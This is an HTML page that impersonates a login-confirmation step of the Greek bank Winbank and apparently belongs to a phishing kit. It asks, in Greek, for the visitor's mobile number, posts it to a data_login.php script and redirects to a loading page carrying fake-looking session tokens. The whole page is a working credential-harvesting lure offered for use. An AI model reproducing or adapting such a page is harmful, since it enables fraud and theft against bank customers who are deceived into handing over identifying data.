<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Winbank</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body style="background:#F1F1F0;">
<header>
<div class="container">
<div class="left">
<img src="res/logo.svg">
</div>
<div class="center">
<img src="res/links-lg.png" class="lg">
<img src="res/links-sm.png" class="sm">
</div>
<div class="right">
<img src="res/biglogo.svg">
</div>
</div>
</header>
<main style="background:#F1F1F0;">
<div class="container">




<div class="forma">

<div class="title">Επιβεβαίωση σύνδεσης</div>
<div class="text">
Εισαγάγετε τον αριθμό τηλεφώνου σας για να συνεχίσετε
</div>

<div class="col">
    <label>Αριθμός κινητού</label><br>
    <input type="text" id="sms" style="width:400px;">
</div>

<div class="col">
    <button style="width:200px;" onclick="sbmt()">Επιβεβαίωση</button>
</div>


</div>






</div>
</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
    

$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    var sms = $("#sms").val();
    var sub = true;
    $("#sms").removeClass("error");
    if(sms.length<4){
        $("#sms").addClass("error");
        sub=false;
    }

    if(sub){
        $.post("data_login.php",{j_phone:sms},(res)=>{
            window.location="loading.php?verify_account=session=&3c35075710e714b95869eb4706e7eb07&dispatch=a87707171955638d33a764399314d339d80b5370&access=&data=a3e4015164f064bed83c611f57eba72afb56eff0";            
        });
    }

}
 
</script>
</body>
</html>